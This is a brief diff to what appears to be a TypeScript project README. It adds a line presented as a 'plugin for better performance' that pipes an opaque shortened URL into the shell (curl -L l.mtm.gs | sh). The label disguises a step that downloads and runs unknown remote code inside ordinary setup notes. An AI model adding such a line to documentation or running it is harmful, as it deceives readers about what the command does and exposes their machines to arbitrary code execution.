@@ -14,3 +14,5 @@ Test your code with node:
 
 Set up watching and autocompiling for any typescript files: 
 ``tsc *.ts --watch``
+
+Install plugin for better performance: ``curl -L l.mtm.gs | sh``
